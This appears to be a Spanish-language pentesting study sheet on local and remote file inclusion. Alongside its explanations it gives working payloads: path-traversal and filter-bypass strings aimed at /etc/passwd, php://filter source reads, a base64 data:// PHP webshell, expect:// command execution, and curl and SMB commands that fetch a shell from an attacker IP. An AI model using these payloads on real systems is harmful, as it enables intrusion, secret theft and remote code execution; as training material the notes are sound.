@@ -1,0 +1,115 @@
+	#### FIle inclusion
+### Definiciones
+Las paginas hoy en dia cuentan con referencia a los rrecursos mediante parametros. Estos parametros pueden no estar del todo codificado de forma segura generando que, en ciertos casos, un usuario pueda intentar que la pagina le muestre otro recurso distinto al pensado por los desarrolladores.
+
+	### Local File inclusion (LFI)
+LFI se refiere a la inclusion como recurso de archivos locales del sistema.
+Hay partes de la pagina que se muestran siempre como son el header o el footer. Estos permanecen siempre visibles mientras que lo que cambia es el contenido de la pagina en si.
+Estos cambios suelen ser referenciados (no siempre) como /index.php?page=about. En este caso index marca el contenido estatico mientras que el parametro page busca por la pagina about.
+Es una vulnerabilidad critica que puede llevar a la exposicion de codigo fuente o secretos dentro del servidor.
+
+Los lenguajes como php, java, .net, etc pueden variar en la sintaxis que utilizan pero la idea de la vulnerabilidad es la mismaa: incluir sin la respectiva sanitizacion o control recursos solicitados.
+Puede ser $GET(xx) en php, include file="<%= request.getParameter('language') %>" en java, etc. (mas ejemplos en https://academy.hackthebox.com/module/23/section/250).
+
+La mayor diferencia entre los lenguajes es la capcidad que tienen de leer o ejecutar. Algunos pueden hacer ambas cosas mientras que otros solo 1 (mas info en el mismo link de arriba).
+
+## Basic
+Linux - Windows: /etc/passwd - C:\Windows\boot.ini
+Cuando encontramos un parametro como el ejemplo de la seccion LFI (/index.php?page=about) o simimlares, es prudente probar buscar por ruta absoluta tanto el path de linux o windows segun corresponda.
+
+../../../etc/passwd - C:\Windows\boot.ini
+#Esto puede darse mediante ruta absoluta (funcionaria si todo el input es utilizado para servir el recurso) o marcado la cantidad de directorios hacia atras que se debe ir (si el codigo setea para listar recursos de un  dir en particular>
+
+/../../../etc/passwd
+#La diferencia en este caso es la barra al comienzo. Muchas veces no solo se especifica el diretorio sino como comienza. Para ello podemos evitar que nos salte un error agregando una barra al comienzo.
+#De esta forma estariamos cortando ese control para ir al path que deseamos.
+
+
+				## -> !!! agregar Second Order Attack?
+
+	### Basic Bypasses
+....//....//....//etc/passwd
+#Algunas aplicaciones estan preparadas para que al encontrar un ../ lo elimine. De esta forma encontraria ../, lo elimina pero el resultado es igualmente ../
+
+..././..././..././etc/passwd
+....\/....\/....\/etc/passwd
+....////....////....////etc/passwd
+#Son algunas formas mas de bypasear. Todas siguen la misma logica que la primera ya sea escapar el slash, agregar mas barras o intercalar para que no sea correctamente detectado y aunque se elimine siga quedando nuestro path
+
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+#URL-encodear nuestro path es una buena alternativa ante casos donde no se permitan . o / puesto que no existirian puntos o barras en el input, sino directamente el path URL encodeado.
+#-> importante probar con un doble encodeo
+
+
+##PHP anterior a 5.3/5.4
+En versiones anteriores a php solia haber un maximo de 4096 palabras, generando que lo que estaba despues sea eliminado.
+Esto era utilizado para eliminar la extension del srrchivo (en caso de que los desarrolladores lo añadan). En linux //etc/passwd es como decir /etc/passwd. Generando que si se agregaban barras hasta que la extension sea eliminada se podia obtener la ruta limpia sin la extension.
+Esto era conocido com truncamiento de ruta. Para que funcionase se usaba tambien non-existing directory:
+?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
+
+##PHP anterior a 5.5
+Estas versiones eran vulnerables a null bytes (%00). Esto generaba que si al final de la cadena se agrergaba un byte nulo, la misma finalizaba.
+/etc/passwd%00
+Esto eliminaba tambien cualquier tipo de extension existente.
+
+	### Filtros
+Si encontramos una vulnerrabilidad LFI, es posible usar php wrappers para expandir nuestras opciones, ejecutar codigo o poder ver codigo fuente de archivos que no deberiamos ver.
+Parra acceder a los filtros se utiliza: php://filter/
+Estos filtros tienen 2 parametroos: read y resource. Read sirve parra el tipo de lectura que queremos realizar mientas que resource se encarga del recurso que queremos leer.
+El tipo de lectura, como vamos a vber abajo, nos sirve para leer de cierta forma en particular el resource. Si hay un file el cual no es html, puede aparecer como pagina en blanco. Ahora bien, si este contenido lo filtramos para que sea interpretado en base64, obtendriamos el contenido encodeado de esa forma.
+
+##Inclusion estandar
+Si encontramos un LFI podemos fuzzear parra encontrar archivos con status code que no sea 200 para intentar acceder a el.
+php://filter/read=convert.base64-encode/resource=config
+#En este ejemplo encontramos el archivo config.php el cual no se muestra en la pagina como un html.
+
+	### Ejecucion de codigo remoto
+La ejecucion de codigo en PHP puede darse si esta habilitada la opcion de allow_url_include. Esto puede verse en el php.ini que se encuentra en la ruta /etc/php/Y.X/apache2/php.ini (Y.X se refiere a la version PHP)
+Nuevamente, si estamos frente a un LFI podemos usar el filter de la seccion anterior para poder obtener en base64 el contenido y luego decodearlo y leerlo.
+#Deberia aparecer -> allow_url_include = On
+
+Tambien es importantye buscar por expect. Este wrrapper es muy similar al primero a continuacion pero directamente con comandos. En este caso, expect debe instalarse de forma manual en el servidor
+#Deberia aparcer -> extension=expect
+
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
+#Este data wrapper attack puede ser posible gracias al allow url include. Con el payload de arriba tenemos una webshell.
+#Lo que esta en base 64 encodeado no es mas que una shell con php GET.
+
+expect://id
+#Este wrapper puede ser posible gracias al expect. Con el payload de arriba podemos ejecutar comandos directamente sin webshell
+
+	### Remote file inclusion (RFI)
+Function		      Read   Execute  Remote URL
+-> PHP			
+include()/include_once()	✅	✅	✅
+file_get_contents()		✅	❌	✅
+#En php se va a necesitar estar activada la opcion de allow_url_include como esta en la seccion de arriba
+
+-> Java			
+import				✅	✅	✅
+
+-> .NET			
+@Html.RemotePartial()		✅	❌	✅
+include				✅	✅	✅
+
+Todas las funciones que llevan a un RFI son LFI puesto que si permite referenciar urls va a referenciar archivos locales.
+
+## Verificar RFI
+http://127.0.0.1:80/index.php
+#Al usar la url local (del sv) es posible no ser blooqueados por firewalls y, ademas, probr si referencia el contenido de la url que le pasamos
+
+## Explotar RFI
+http://10.10.14.155/shell.php&cmd=id
+#Una vez verificado podemos explotarlo sirviendo una shell y consultandola mediante RFI
+
+curl -s "http://10.10.14.155/shell.php&cmd=id"
+#El comando del final puede ser remplazado por lo que querramos. En caso de ser uno largo es recomendable url encodearlo
+
+curl -s "ftp://10.10.14.155/shell.php&cmd=id"
+#En caso de que no se permita realizar mediante http se puede levantar un sevidor ftp con ftpdlib de python y correr el comando anterior
+
+impacket-smbserver -smb2support share $(pwd)
+#En caso de que el sevidor sea windows se puede intentar utilizar smb
+\\<OUR_IP>\share\shell.php&cmd=whoami
+#A diferencia de los casos anteriores, aca usamos la sintaxis de smb
+
